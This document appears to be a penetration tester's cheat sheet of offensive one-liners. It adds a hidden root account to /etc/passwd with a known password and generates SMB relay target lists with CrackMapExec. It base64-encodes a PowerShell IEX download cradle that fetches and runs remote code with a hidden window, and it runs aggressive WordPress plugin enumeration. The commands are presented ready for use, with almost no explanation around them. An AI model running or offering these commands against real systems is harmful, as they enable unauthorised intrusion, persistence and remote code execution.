# Misc Snippets

## Linux

One line echo new user into `/etc/passwd`.

```bash
# Password: Password123
echo 'viper:$1$luDZJMtq$4ljcR6cSb41FraIUQIiQx/:0:0:viper:/home/viper:/bin/bash' >> /etc/passwd
```

## Generate Relay list

```
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets-to-relay.txt
```

## Spoof Checking

**SmartFense:** [https://www.smartfense.com/en-us/tools/spoofcheck/](https://www.smartfense.com/en-us/tools/spoofcheck/)

**Spoofcheck:** [https://github.com/BishopFox/spoofcheck](https://github.com/BishopFox/spoofcheck)

## PowerShell Encoded String

```powershell
$b64 = 'IEX ((new-object net.webclient).downloadstring("[IP]"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))

# Execute
Powershell.exe -w -enc "[Base64 String]"

# From Linux
set b64 'IEX ((new-object net.webclient).downloadstring("[IP]"))'
echo -en $b64 | iconv -t UTF-16LE | base64 -w 0
```

## Wpscan

All plugins detectionb

```bash
wpscan --url http://<IP> -t 40 --detection-mode mixed --enumerate ap --plugins-detection aggressive 
```
